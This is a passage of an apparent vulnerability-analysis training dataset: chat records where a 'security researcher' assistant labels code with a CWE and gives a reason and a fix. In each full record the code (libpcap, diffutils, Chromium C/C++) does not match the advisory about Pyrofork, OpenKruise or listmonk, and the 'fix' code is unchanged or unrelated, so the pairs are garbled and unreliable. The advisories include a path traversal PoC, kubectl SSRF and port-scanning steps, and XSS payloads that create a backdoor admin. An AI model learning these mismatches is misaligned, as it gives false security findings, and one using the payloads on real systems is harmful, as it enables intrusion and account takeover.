rpcap_openreply));\n\topenreply->linktype = htonl(pcap_datalink(fp));\n\topenreply->tzoff = 0; /* This is always 0 for live captures */\n\n\tpcap_close(fp);\n\n\tif (sock_send(pars->sockctrl, sendbuf, sendbufidx, errbuf, PCAP_ERRBUF_SIZE) == -1)\n\t{\n\t\trpcapd_log(LOGPRIO_ERROR, \"Send to client failed: %s\", errbuf);\n\t\treturn -1;\n\t}\n\treturn 0;\n\nerror:\n\tif (rpcap_senderror(pars->sockctrl, ver, PCAP_ERR_OPEN,\n\t    errmsgbuf, errbuf) == -1)\n\t{\n\t\trpcapd_log(LOGPRIO_ERROR, \"Send to client failed: %s\", errbuf);\n\t\treturn -1;\n\t}\n\n\tif (rpcapd_discard(pars->sockctrl, plen) == -1)\n\t{\n\t\treturn -1;\n\t}\n\treturn 0;\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Pyrofork has a Path Traversal in download_media Method:\n\nprefix_components (char *filename, bool checkdirs)\n{\n  int count = 0;\n  struct stat stat_buf;\n  int stat_result;\n  char *f = filename + FILE_SYSTEM_PREFIX_LEN (filename);\n\n  if (*f)\n    while (*++f)\n      if (ISSLASH (f[0]) && ! ISSLASH (f[-1]))\n\t{\n\t  if (checkdirs)\n\t    {\n\t      *f = '\\0';\n\t      stat_result = lstat (filename, &stat_buf);\n\t      *f = '/';\n\t      if (! (stat_result == 0 && S_ISDIR (stat_buf.st_mode)))\n\t\tbreak;\n\t    }\n\n\t  count++;\n\t}\n\n  return count;\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-22\nREASON: ## Summary\n\nThe `download_media` method in Pyrofork does not sanitize filenames received from Telegram messages before using them in file path construction. This allows a remote attacker to write files to arbitrary locations on the filesystem by sending a specially crafted document with path traversal sequences (e.g., `../`) or absolute paths in the filename.\n\n---\n\n## Details\n\nWhen downloading media, if the user does not specify a custom filename (which is the common/default usage), the method falls back to using the `file_name` attribute from the media object. This attribute originates from Telegram's `DocumentAttributeFilename` and is controlled by the message sender.\n\n### Vulnerable Code Path\n\n**Step 1**: In `pyrogram/methods/messages/download_media.py` (lines 145-151):\n\n```python\nmedia_file_name = getattr(media, \"file_name\", \"\")  # Value from Telegram message\n\ndirectory, file_name = os.path.split(file_name)    # Split user's path parameter\nfile_name = file_name or media_file_name or \"\"     # Falls back to media_file_name if empty\n```\n\nWhen a user calls `download_media(message)` or `download_media(message, \"downloads/\")`, the `os.path.split()` returns an empty filename, causing the code to use `media_file_name` which is attacker-controlled.\n\n**Step 2**: In `pyrogram/client.py` (line 1125):\n\n```python\ntemp_file_path = os.path.abspath(re.sub(\"\\\\\\\\\", \"/\", os.path.join(directory, file_name))) + \".temp\"\n```\n\nThe `os.path.join()` function does not prevent path traversal. When `file_name` contains `../` sequences or is an absolute path, it allows writing outside the intended download directory.\n\n### Why the existing `isabs` check is insufficient\n\nThe check at line 153 in `download_media.py`:\n\n```python\nif not os.path.isabs(file_name):\n    directory = self.PARENT_DIR / (directory or DEFAULT_DOWNLOAD_DIR)\n```\n\nThis check only handles absolute paths by skipping the directory prefix, but:\n1. For relative paths with `../`, `os.path.isabs()` returns `False`, so the check doesn't catch it\n2. For absolute paths, `os.path.join()` in the next step will still use the absolute path directly\n\n---\n\n## PoC\n\nThe following Python script demonstrates the vulnerability by simulating the exact code logic from `download_media.py` and `client.py`:\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nPath Traversal PoC for Pyrofork download_media\nDemonstrates CWE-22 vulnerability in filename handling\n\"\"\"\n\nimport os\nimport shutil\nimport tempfile\nfrom pathlib import Path\nfrom dataclasses import dataclass\n\n@dataclass\nclass MockDocument:\n    \"\"\"Simulates a Telegram Document with attacker-controlled file_name\"\"\"\n    file_id: str\n    file_name: str  # Attacker-controlled!\n\n@dataclass  \nclass MockMessage:\n    \"\"\"Simulates a Telegram Message\"\"\"\n    document: MockDocument\n\nDEFAULT_DOWNLOAD_DIR = \"downloads/\"\n\ndef vulnerable_download_media(parent_dir, message, file_name=DEFAULT_DOWNLOAD_DIR):\n    \"\"\"\n    Simulates the vulnerable logic from:\n    - pyrogram/methods/messages/download_media.py (lines 145-154)\n    - pyrogram/client.py (line 1125)\n    \"\"\"\n    media = message.document\n    media_file_name = getattr(media, \"file_name\", \"\")\n    \n    # Line 150-151: Split and fallback\n    directory, file_name = os.path.split(file_name)\n    file_name = file_name or media_file_name or \"\"\n    \n    # Line 153-154: isabs check (insufficient!)\n    if not os.path.isabs(file_name):\n        directory = parent_dir / (directory or DEFAULT_DOWNLOAD_DIR)\n    \n    if not file_name:\n        file_name = \"generated_file.bin\"\n    \n    # Line 1125 in client.py: Path construction\n    import re\n    temp_file_path = os.path.abspath(\n        re.sub(\"\\\\\\\\\", \"/\", os.path.join(str(directory), file_name))\n    ) + \".temp\"\n    \n    return temp_file_path\n\ndef run_poc():\n    print(\"=\" * 60)\n    print(\"PYROFORK PATH TRAVERSAL PoC\")\n    print(\"=\" * 60)\n    \n    with tempfile.TemporaryDirectory() as temp_base:\n        parent_dir = Path(temp_base)\n        expected_dir = str(parent_dir / \"downloads\")\n        \n        print(f\"\\n[*] Bot working directory: {parent_dir}\")\n        print(f\"[*] Expected download dir: {expected_dir}\")\n        \n        # Attack: Path traversal with ../\n        print(\"\\n\" + \"-\" * 60)\n        print(\"TEST: Path Traversal Attack\")\n        print(\"-\" * 60)\n        \n        malicious_msg = MockMessage(\n            document=MockDocument(\n                file_id=\"test_id\",\n                file_name=\"../../../tmp/malicious_file\"\n            )\n        )\n        \n        result_path = vulnerable_download_media(\n            parent_dir=parent_dir,\n            message=malicious_msg,\n            file_name=\"downloads/\"\n        )\n        \n        # Remove .temp suffix for final path\n        final_path = os.path.splitext(result_path)[0]\n        \n        print(f\"[*] Malicious filename: ../../../tmp/malicious_file\")\n        print(f\"[*] Resulting path: {final_path}\")\n        \n        if not final_path.startswith(expected_dir):\n            print(f\"\\n[!] VULNERABILITY CONFIRMED\")\n            print(f\"[!] File path escapes intended directory!\")\n            print(f\"[!] Expected: {expected_dir}/...\")\n            print(f\"[!] Actual: {final_path}\")\n        else:\n            print(\"[*] Path is within expected directory\")\n\nif __name__ == \"__main__\":\n    run_poc()\n```\n\n### How to Run\n\nSave the above script and run:\n\n```bash\npython3 poc_script.py\n```\n\n### Expected Output\n\n```\n============================================================\nPYROFORK PATH TRAVERSAL PoC\n============================================================\n\n[*] Bot working directory: /tmp/tmpXXXXXX\n[*] Expected download dir: /tmp/tmpXXXXXX/downloads\n\n------------------------------------------------------------\nTEST: Path Traversal Attack\n------------------------------------------------------------\n[*] Malicious filename: ../../../tmp/malicious_file\n[*] Resulting path: /tmp/malicious_file\n\n[!] VULNERABILITY CONFIRMED\n[!] File path escapes intended directory!\n[!] Expected: /tmp/tmpXXXXXX/downloads/...\n[!] Actual: /tmp/malicious_file\n```\n\n### Why This Proves the Vulnerability\n\n1. The PoC uses the **exact same logic** as the vulnerable code in `download_media.py` and `client.py`\n2. The malicious filename `../../../tmp/malicious_file` causes the path to escape from `/tmp/tmpXXX/downloads/` to `/tmp/malicious_file`\n3. Python's `os.path.join()` and `os.path.abspath()` behavior is deterministic - this will work the same way in the real library\n\n---\n\n## Impact\n\n### Who is affected?\n\n- Telegram bots or user accounts using Pyrofork that download media with default parameters\n- The common usage pattern `await client.download_media(message)` is affected\n\n### Conditions required for exploitation\n\n1. Attacker must be able to send messages to the victim's bot/account\n2. Victim must download the media without specifying a custom filename\n3. The bot process must have write permissions to the target location\n\n### Potential consequences\n\n- **Arbitrary file write** to locations writable by the bot process\n- Overwriting existing files could cause denial of service or configuration issues\n- In specific deployment scenarios, could potentially lead to code execution (e.g., if bot runs with elevated privileges)\n\n---\n\n## Recommended Fix\n\nAdd filename sanitization in `download_media.py` after line 151:\n\n```python\nfile_name = file_name or media_file_name or \"\"\n\n# Add this sanitization block:\nif file_name:\n    # Remove any path components, keeping only the basename\n    file_name = os.path.basename(file_name)\n    # Remove null bytes which could cause issues\n    file_name = file_name.replace('\\x00', '')\n    # Handle edge cases\n    if not file_name or file_name in ('.', '..'):\n        file_name = \"\"\n```\n\nThis ensures that only the filename component is used, stripping any directory traversal sequences or absolute paths.\n\n---\n\nThank you for your time in reviewing this report. Please let me know if you need any additional information or clarification.\nFIX:\nprefix_components (char *filename, bool checkdirs)\n{\n  int count = 0;\n  struct stat stat_buf;\n  int stat_result;\n  char *f = filename + FILE_SYSTEM_PREFIX_LEN (filename);\n\n  if (*f)\n    while (*++f)\n      if (ISSLASH (f[0]) && ! ISSLASH (f[-1]))\n\t{\n\t  if (checkdirs)\n\t    {\n\t      *f = '\\0';\n\t      stat_result = lstat (filename, &stat_buf);\n\t      *f = '/';\n\t      if (! (stat_result == 0 && S_ISDIR (stat_buf.st_mode)))\n\t\tbreak;\n\t    }\n\n\t  count++;\n\t}\n\n  return count;\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for OpenKruise PodProbeMarker is Vulnerable to SSRF via Unrestricted Host Field:\n\ndaemon_msg_open_req(uint8 ver, struct daemon_slpars *pars, uint32 plen,\n    char *source, size_t sourcelen)\n{\n\tchar errbuf[PCAP_ERRBUF_SIZE];\t\t// buffer for network errors\n\tchar errmsgbuf[PCAP_ERRBUF_SIZE];\t// buffer for errors to send to the client\n\tpcap_t *fp;\t\t\t\t// pcap_t main variable\n\tint nread;\n\tchar sendbuf[RPCAP_NETBUF_SIZE];\t// temporary buffer in which data to be sent is buffered\n\tint sendbufidx = 0;\t\t\t// index which keeps the number of bytes currently buffered\n\tstruct rpcap_openreply *openreply;\t// open reply message\n\n\tif (plen > sourcelen - 1)\n\t{\n\t\tpcap_snprintf(errmsgbuf, PCAP_ERRBUF_SIZE, \"Source string too long\");\n\t\tgoto error;\n\t}\n\n\tnread = sock_recv(pars->sockctrl, source, plen,\n\t    SOCK_RECEIVEALL_YES|SOCK_EOF_IS_ERROR, errbuf, PCAP_ERRBUF_SIZE);\n\tif (nread == -1)\n\t{\n\t\trpcapd_log(LOGPRIO_ERROR, \"Read from client failed: %s\", errbuf);\n\t\treturn -1;\n\t}\n \tsource[nread] = '\\0';\n \tplen -= nread;\n \n \n\tif ((fp = pcap_open_live(source,\n\t\t\t1500 /* fake snaplen */,\n\t\t\t0 /* no promis */,\n\t\t\t1000 /* fake timeout */,\n\t\t\terrmsgbuf)) == NULL)\n\t\tgoto error;\n\n\tif (sock_bufferize(NULL, sizeof(struct rpcap_header), NULL, &sendbufidx,\n\t    RPCAP_NETBUF_SIZE, SOCKBUF_CHECKONLY, errmsgbuf, PCAP_ERRBUF_SIZE) == -1)\n\t\tgoto error;\n\n\trpcap_createhdr((struct rpcap_header *) sendbuf, ver,\n\t    RPCAP_MSG_OPEN_REPLY, 0, sizeof(struct rpcap_openreply));\n\n\topenreply = (struct rpcap_openreply *) &sendbuf[sendbufidx];\n\n\tif (sock_bufferize(NULL, sizeof(struct rpcap_openreply), NULL, &sendbufidx,\n\t    RPCAP_NETBUF_SIZE, SOCKBUF_CHECKONLY, errmsgbuf, PCAP_ERRBUF_SIZE) == -1)\n\t\tgoto error;\n\n\tmemset(openreply, 0, sizeof(struct rpcap_openreply));\n\topenreply->linktype = htonl(pcap_datalink(fp));\n\topenreply->tzoff = 0; /* This is always 0 for live captures */\n\n\tpcap_close(fp);\n\n\tif (sock_send(pars->sockctrl, sendbuf, sendbufidx, errbuf, PCAP_ERRBUF_SIZE) == -1)\n\t{\n\t\trpcapd_log(LOGPRIO_ERROR, \"Send to client failed: %s\", errbuf);\n\t\treturn -1;\n\t}\n\treturn 0;\n\nerror:\n\tif (rpcap_senderror(pars->sockctrl, ver, PCAP_ERR_OPEN,\n\t    errmsgbuf, errbuf) == -1)\n\t{\n\t\trpcapd_log(LOGPRIO_ERROR, \"Send to client failed: %s\", errbuf);\n\t\treturn -1;\n\t}\n\n\tif (rpcapd_discard(pars->sockctrl, plen) == -1)\n\t{\n\t\treturn -1;\n\t}\n\treturn 0;\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-918\nREASON: ## Summary\n\nPodProbeMarker allows defining custom probes with TCPSocket or HTTPGet handlers. The webhook validation does not restrict the Host field in these probe configurations. Since kruise-daemon runs with hostNetwork=true, it executes probes from the node network namespace. An attacker with PodProbeMarker creation permission can specify arbitrary Host values (127.0.0.1, 169.254.169.254, internal IPs) to trigger SSRF from the node, perform port scanning, and receive response feedback through NodePodProbe status messages.\n\n## Kubernetes Version\n\n- Kubernetes: v1.30.0 (kind cluster)\n- Distribution: kind\n\n## Component Version\n\n- OpenKruise: v1.8.0\n- kruise-daemon: DaemonSet with hostNetwork=true\n- Affected CRDs: PodProbeMarker, NodePodProbe\n\n## Steps To Reproduce\n\n### Environment Setup\n\n1. Install OpenKruise v1.8.0 in kind cluster:\n```bash\nhelm repo add openkruise https://openkruise.github.io/charts/\nhelm install kruise openkruise/kruise --version 1.8.0 \\\n  --namespace kruise-system --create-namespace\n```\n\n2. Verify kruise-daemon runs with hostNetwork:\n```bash\nkubectl -n kruise-system get ds kruise-daemon -o yaml | grep hostNetwork\n```\nOutput:\n```\nhostNetwork: true\n```\n\n3. Create test namespace and RBAC:\n```bash\nkubectl apply -f - <<EOF\napiVersion: v1\nkind: Namespace\nmetadata:\n  name: tenant-a\n---\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: attacker\n  namespace: tenant-a\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: Role\nmetadata:\n  name: ppm-creator\n  namespace: tenant-a\nrules:\n- apiGroups: [\"apps.kruise.io\"]\n  resources: [\"podprobemarkers\"]\n  verbs: [\"create\",\"get\",\"list\",\"watch\"]\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: RoleBinding\nmetadata:\n  name: ppm-creator-binding\n  namespace: tenant-a\nsubjects:\n- kind: ServiceAccount\n  name: attacker\n  namespace: tenant-a\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: Role\n  name: ppm-creator\nEOF\n```\n\n4. Deploy victim workload:\n```bash\nkubectl apply -f - <<EOF\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: victim\n  namespace: tenant-a\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: victim\n  template:\n    metadata:\n      labels:\n        app: victim\n    spec:\n      containers:\n      - name: victim\n        image: busybox:1.36\n        command: [\"/bin/sh\",\"-c\",\"sleep 36000\"]\nEOF\n```\n\n### Exploitation Steps\n\n5. Verify node-local port accessibility (kubelet healthz):\n```bash\nNODE_CONTAINER=$(docker ps --format '{{.Names}}' | grep control-plane)\ndocker exec $NODE_CONTAINER curl -s -o /dev/null -w \"%{http_code}\" http://127.0.0.1:10248/healthz\n```\nOutput:\n```\n200\n```\n\n6. Create SSRF PodProbeMarker targeting node-local port (as attacker):\n```bash\nkubectl -n tenant-a apply --as system:serviceaccount:tenant-a:attacker -f - <<EOF\napiVersion: apps.kruise.io/v1alpha1\nkind: PodProbeMarker\nmetadata:\n  name: ppm-tcp-ssrf\n  namespace: tenant-a\nspec:\n  selector:\n    matchLabels:\n      app: victim\n  probes:\n  - name: tcp-ssrf\n    containerName: victim\n    podConditionType: ssrf.kruise.io/tcp\n    probe:\n      tcpSocket:\n        host: 127.0.0.1\n        port: 10248\n      timeoutSeconds: 2\n      periodSeconds: 5\nEOF\n```\nOutput:\n```\npodprobemarker.apps.kruise.io/ppm-tcp-ssrf created\n```\n\n7. Wait for probe execution and observe SSRF result:\n```bash\nsleep 10\nNODE_NAME=$(kubectl get nodes -o jsonpath='{.items[0].metadata.name}')\nkubectl get nodepodprobe $NODE_NAME -o yaml | grep -A 20 \"ppm-tcp-ssrf\"\n```\nOutput:\n```yaml\n      name: ppm-tcp-ssrf#tcp-ssrf\n      probe:\n        tcpSocket:\n          host: 127.0.0.1\n          port: 10248\nstatus:\n  podProbeStatuses:\n  - name: victim-8596ff64d6-jklnb\n    namespace: tenant-a\n    probeStates:\n    - lastProbeTime: \"2026-01-13T17:48:10Z\"\n      name: ppm-tcp-ssrf#tcp-ssrf\n      state: Succeeded\n```\n\nEvidence: Probe succeeded, confirming kruise-daemon accessed node-local port 127.0.0.1:10248 from node network namespace.\n\n8. Demonstrate port scanning capability (closed port):\n```bash\nkubectl -n tenant-a apply --as system:serviceaccount:tenant-a:attacker -f - <<EOF\napiVersion: apps.kruise.io/v1alpha1\nkind: PodProbeMarker\nmetadata:\n  name: ppm-tcp-closed\n  namespace: tenant-a\nspec:\n  selector:\n    matchLabels:\n      app: victim\n  probes:\n  - name: tcp-closed\n    containerName: victim\n    podConditionType: ssrf.kruise.io/tcp-closed\n    probe:\n      tcpSocket:\n        host: 127.0.0.1\n        port: 9999\n      timeoutSeconds: 2\n      periodSeconds: 5\nEOF\n```\n\n9. Observe port scanning result:\n```bash\nkubectl get nodepodprobe $NODE_NAME -o yaml | grep -A 5 \"ppm-tcp-closed\"\n```\nOutput:\n```yaml\n    - lastProbeTime: \"2026-01-13T17:51:08Z\"\n      message: 'dial tcp 127.0.0.1:9999: connect: connection refused'\n      name: ppm-tcp-closed#tcp-closed\n      state: Failed\n```\n\nEvidence: Failed probe with \"connection refused\" message enables port state differentiation for scanning.\n\n10. Verify Pod condition and events:\n```bash\nVICTIM_POD=$(kubectl -n tenant-a get pod -l app=victim -o jsonpath='{.items[0].metadata.name}')\nkubectl -n tenant-a describe pod $VICTIM_POD | grep -A 10 \"Conditions:\"\n```\nOutput:\n```\nConditions:\n  Type                        Status\n  ssrf.kruise.io/tcp          True\n  ssrf.kruise.io/tcp-closed   False\n\nEvents:\n  Normal  KruiseProbeSucceeded  96s (x24 over 3m26s)  kruise-daemon-podprobe\n```\n\n### Source Code Evidence\n\n11. TCPSocket Host field used without restriction:\n\nFile: `pkg/daemon/podprobe/prober.go`\n```go\nfunc (pb *prober) newTCPSocketProber(tcp *v1.TCPSocketAction, podIP string) tcpProber {\n    host := tcp.Host\n    if host == \"\" {\n        host = podIP\n    }\n    return tcpProber{\n        tcp: tcp,\n        host: host,\n    }\n}\n```\n\n12. Webhook validation does not check Host field:\n\nFile: `pkg/webhook/podprobemarker/validating/probe_create_update_handler.go`\n```go\nfunc validateTCPSocketAction(tcp *corev1.TCPSocketAction, fldPath *field.Path) field.ErrorList {\n    return ValidatePortNumOrName(tcp.Port, fldPath.Child(\"port\"))\n}\n```\n\nNote: Only port validation, no Host restriction.\n\n### Attack Scenarios\n\nScenario 1 - Cloud metadata access:\n```yaml\nprobe:\n  tcpSocket:\n    host: 169.254.169.254\n    port: 80\n```\n\nScenario 2 - Internal service discovery:\n```yaml\nprobe:\n  tcpSocket:\n    host: 10.0.0.1\n    port: 6379\n```\n\nScenario 3 - Node-local kubelet API:\n```yaml\nprobe:\n  tcpSocket:\n    host: 127.0.0.1\n    port: 10250\n```\n\n## Supporting Material/References\n\n### Verification Evidence\n\n1. kruise-daemon hostNetwork configuration:\n```bash\n$ kubectl -n kruise-system get ds kruise-daemon -o yaml | grep -A 2 \"hostNetwork\"\n      hostNetwork: true\n      restartPolicy: Always\n```\n\n2. Successful SSRF to open port (127.0.0.1:10248):\n```yaml\nstatus:\n  podProbeStatuses:\n    probeStates:\n    - name: ppm-tcp-ssrf#tcp-ssrf\n      state: Succeeded\n```\n\n3. Port scanning result for closed port (127.0.0.1:9999):\n```yaml\nstatus:\n  podProbeStatuses:\n    probeStates:\n    - message: 'dial tcp 127.0.0.1:9999: connect: connection refused'\n      name: ppm-tcp-closed#tcp-closed\n      state: Failed\n```\n\n4. Pod condition reflecting probe results:\n```\nConditions:\n  Type                        Status\n  ssrf.kruise.io/tcp          True\n  ssrf.kruise.io/tcp-closed   False\n```\n\n### Impact Assessment\n\n- Confidentiality: Medium-High. Access to node-local services, cloud metadata, internal network resources.\n- Integrity: Low. Primarily information disclosure.\n- Availability: Medium. Resource consumption from probe requests.\n\n### Limitations\n\nHTTPGet probe rejected by webhook in OpenKruise v1.8.0:\n```\nError: admission webhook denied the request: spec.probe.probe: Forbidden: current no support http probe\n```\n\nTCPSocket probe remains vulnerable.\n\n### Remediation\n\nTemporary mitigation:\n- Restrict PodProbeMarker creation permissions\n- Apply network policies limiting kruise-daemon egress\n- Audit existing PodProbeMarker resources\n\nPermanent fix:\n- Enforce Host field restrictions in webhook validation\n- Deny private IP ranges (127.0.0.0/8, 10.0.0.0/8, 169.254.0.0/16)\n- Require Host to be empty or equal to PodIP\n- Sanitize error messages in NodePodProbe status\n\n---\n\n**Verification Environment**: kind v1.30.0 + OpenKruise v1.8.0\nFIX:\ndaemon_msg_open_req(uint8 ver, struct daemon_slpars *pars, uint32 plen,\n    char *source, size_t sourcelen)\n{\n\tchar errbuf[PCAP_ERRBUF_SIZE];\t\t// buffer for network errors\n\tchar errmsgbuf[PCAP_ERRBUF_SIZE];\t// buffer for errors to send to the client\n\tpcap_t *fp;\t\t\t\t// pcap_t main variable\n\tint nread;\n\tchar sendbuf[RPCAP_NETBUF_SIZE];\t// temporary buffer in which data to be sent is buffered\n\tint sendbufidx = 0;\t\t\t// index which keeps the number of bytes currently buffered\n\tstruct rpcap_openreply *openreply;\t// open reply message\n\n\tif (plen > sourcelen - 1)\n\t{\n\t\tpcap_snprintf(errmsgbuf, PCAP_ERRBUF_SIZE, \"Source string too long\");\n\t\tgoto error;\n\t}\n\n\tnread = sock_recv(pars->sockctrl, source, plen,\n\t    SOCK_RECEIVEALL_YES|SOCK_EOF_IS_ERROR, errbuf, PCAP_ERRBUF_SIZE);\n\tif (nread == -1)\n\t{\n\t\trpcapd_log(LOGPRIO_ERROR, \"Read from client failed: %s\", errbuf);\n\t\treturn -1;\n\t}\n \tsource[nread] = '\\0';\n \tplen -= nread;\n \n\t// Is this a URL rather than a device?\n\t// If so, reject it.\n\tif (is_url(source))\n\t{\n\t\tpcap_snprintf(errmsgbuf, PCAP_ERRBUF_SIZE, \"Source string refers to a remote device\");\n\t\tgoto error;\n\t}\n \n\tif ((fp = pcap_open_live(source,\n\t\t\t1500 /* fake snaplen */,\n\t\t\t0 /* no promis */,\n\t\t\t1000 /* fake timeout */,\n\t\t\terrmsgbuf)) == NULL)\n\t\tgoto error;\n\n\tif (sock_bufferize(NULL, sizeof(struct rpcap_header), NULL, &sendbufidx,\n\t    RPCAP_NETBUF_SIZE, SOCKBUF_CHECKONLY, errmsgbuf, PCAP_ERRBUF_SIZE) == -1)\n\t\tgoto error;\n\n\trpcap_createhdr((struct rpcap_header *) sendbuf, ver,\n\t    RPCAP_MSG_OPEN_REPLY, 0, sizeof(struct rpcap_openreply));\n\n\topenreply = (struct rpcap_openreply *) &sendbuf[sendbufidx];\n\n\tif (sock_bufferize(NULL, sizeof(struct rpcap_openreply), NULL, &sendbufidx,\n\t    RPCAP_NETBUF_SIZE, SOCKBUF_CHECKONLY, errmsgbuf, PCAP_ERRBUF_SIZE) == -1)\n\t\tgoto error;\n\n\tmemset(openreply, 0, sizeof(struct rpcap_openreply));\n\topenreply->linktype = htonl(pcap_datalink(fp));\n\topenreply->tzoff = 0; /* This is always 0 for live captures */\n\n\tpcap_close(fp);\n\n\tif (sock_send(pars->sockctrl, sendbuf, sendbufidx, errbuf, PCAP_ERRBUF_SIZE) == -1)\n\t{\n\t\trpcapd_log(LOGPRIO_ERROR, \"Send to client failed: %s\", errbuf);\n\t\treturn -1;\n\t}\n\treturn 0;\n\nerror:\n\tif (rpcap_senderror(pars->sockctrl, ver, PCAP_ERR_OPEN,\n\t    errmsgbuf, errbuf) == -1)\n\t{\n\t\trpcapd_log(LOGPRIO_ERROR, \"Send to client failed: %s\", errbuf);\n\t\treturn -1;\n\t}\n\n\tif (rpcapd_discard(pars->sockctrl, plen) == -1)\n\t{\n\t\treturn -1;\n\t}\n\treturn 0;\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for listmonk Vulnerable to Stored XSS Leading to Admin Account Takeover:\n\nMetricsWebContentsObserver::GetPageLoadExtraInfoForCommittedLoad() {\n  DCHECK(committed_load_);\n  return committed_load_->ComputePageLoadExtraInfo();\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-79\nREASON: ## Security Advisory: Stored XSS Leading to Admin Account Takeover\n\n**Affected Versions:** \u2264 5.1.0  \n**Vulnerability Type:** CWE-79: Stored Cross-Site Scripting  \n\n---\n\n## Summary\n\nA lower-privileged user with campaign management permissions can inject malicious JavaScript into campaigns or templates. When a higher-privileged user (Super Admin) views or previews this content, the XSS executes in their browser context, allowing the attacker to perform privileged actions such as creating backdoor admin accounts.\n\nThe attack can be weaponized via the **public archive feature**, where victims simply need to visit a link - no preview click required.\n\n---\n\n## Required Attacker Permissions\n\n```\ncampaigns:manage    - Create/edit campaigns\ncampaigns:get       - View campaigns  \nlists:get_all       - Access lists\ntemplates:get       - Access templates\n```\n\n**Note:** These are common permissions for content managers who are not full admins.\n\n---\n\n## Attack Vectors\n\n### Vector 1: Raw HTML (Direct Script Tag)\n\n```html\n<script>\nfetch('/api/users', {\n  method: 'POST',\n  headers: {'Content-Type': 'application/json'},\n  credentials: 'include',\n  body: '{\"username\":\"backdoor\",\"email\":\"backdoor@evil.com\",\"name\":\"Backdoor\",\"password\":\"Hacked123\",\"type\":\"user\",\"status\":\"enabled\",\"userRoleId\":1,\"user_role_id\":1}'\n});\n</script>\n```\n\n### Vector 2: Go Template `Safe` Function\n\n```\n{{ `<script>fetch('/api/users',{method:'POST',headers:{'Content-Type':'application/json'},credentials:'include',body:'{\"username\":\"backdoor\",\"email\":\"backdoor@evil.com\",\"name\":\"Backdoor\",\"password\":\"Hacked123\",\"type\":\"user\",\"status\":\"enabled\",\"userRoleId\":1,\"user_role_id\":1}'});</script>` | Safe }}\n```\n\n---\n\n## Attack Scenarios\n\n### Scenario 1: Campaign Preview Attack\n\n1. Attacker creates campaign with XSS payload\n2. Request is made to super admin: *\"Please review my newsletter draft\"*\n3. Super admin opens campaign and clicks **Preview**\n4. XSS executes \u2192 Backdoor admin account created\n5. Attacker logs in with `backdoor` / `Hacked123`\n\n### Scenario 2: Archive Link Attack (No Click Required)\n\n1. Attacker creates campaign with XSS payload\n2. Attacker enables **Archive** for the campaign\n3. Attacker shares archive link: `http://localhost:9000/archive/{uuid}`\n4. Super admin visits the link (no preview click needed!)\n5. XSS executes automatically \u2192 Account takeover\n\n---\n\n## Proof of Concept\n\n### Step 1: Create Malicious Campaign\n\nAs lower-privileged user, create campaign with body:\n```html\n<script>\nfetch('/api/users', {\n  method: 'POST',\n  headers: {'Content-Type': 'application/json'},\n  credentials: 'include',\n  body: JSON.stringify({\n    username: 'backdoor',\n    email: 'backdoor@evil.com', \n    name: 'Backdoor Admin',\n    password: 'Hacked123',\n    type: 'user',\n    status: 'enabled',\n    userRoleId: 1,\n    user_role_id: 1\n  })\n});\n</script>\n```\n\n### Step 2: Enable Archive (Optional - for link-based attack)\n\n1. Edit campaign settings\n2. Enable \"Archive\"\n3. Copy archive URL: `http://localhost:9000/archive/{campaign-uuid}`\n\n### Step 3: Trigger Execution\n\n**Option A - Preview:**\n- Send campaign to super admin for \"review\"\n- Super admin previews \u2192 XSS fires\n\n**Option B - Archive Link:**\n- Share archive URL with super admin\n- Super admin visits link \u2192 XSS fires automatically\n\n### Step 4: Verify Takeover\n\n```bash\n# Login as backdoor admin\ncurl -X POST \"http://localhost:9000/admin/login\" \\\n  -d \"username=backdoor&password=Hacked123\" \\\n  -c cookies.txt -L\n\n# Verify super admin access\ncurl -b cookies.txt \"http://localhost:9000/api/users\"\n```\n\n---\n\n## Evidence Screenshots\n\n> **[Screenshot 1: Lower-privileged user creating malicious campaign]**\n<img width=\"1892\" height=\"781\" alt=\"Screenshot 2025-12-27 170259\" src=\"https://github.com/user-attachments/assets/b9af26bf-0c5b-4667-ba9a-eea774156d0b\" />\n\n> **[Screenshot 2: Super admin previewing campaign]**\n<img width=\"1686\" height=\"709\" alt=\"image\" src=\"https://github.com/user-attachments/assets/4ca3d5ff-0cd9-4f22-bca0-e26e13c6b1c7\" />\n\n> **[Screenshot 3: Backdoor user successfully created]**\n<img width=\"1370\" height=\"469\" alt=\"Screenshot 2025-12-27 170413\" src=\"https://github.com/user-attachments/assets/18135128-f5af-4023-9aa7-8662a1405ed2\" />\n\n---\n\n## Impact\n\n| Action | Possible via XSS |\n|--------|-----------------|\n| Create backdoor admin | \u2705 Yes |\n| Export all subscribers | \u2705 Yes |\n| Modify SMTP settings | \u2705 Yes |\n| Delete all campaigns | \u2705 Yes |\n| Access API keys/secrets | \u2705 Yes |\n\n---\n\n## Affected Components\n\n| Component | XSS Works? | Method |\n|-----------|-----------|--------|\n| Campaign body (Raw HTML) | \u2705 Yes | Direct `<script>` tag |\n| Campaign body (Template) | \u2705 Yes | `{{ \\` \\` \\| Safe }}` |\n| Template body | \u2705 Yes | Both methods |\n| Campaign archive | \u2705 Yes | Automatic execution on visit |\n\n---\nFIX:\nMetricsWebContentsObserver::GetPageLoadExtraInfoForCommittedLoad() {\n  DCHECK(committed_load_);\n  return committed_load_->ComputePageLoadExtraInfo();\n}\n"}]}
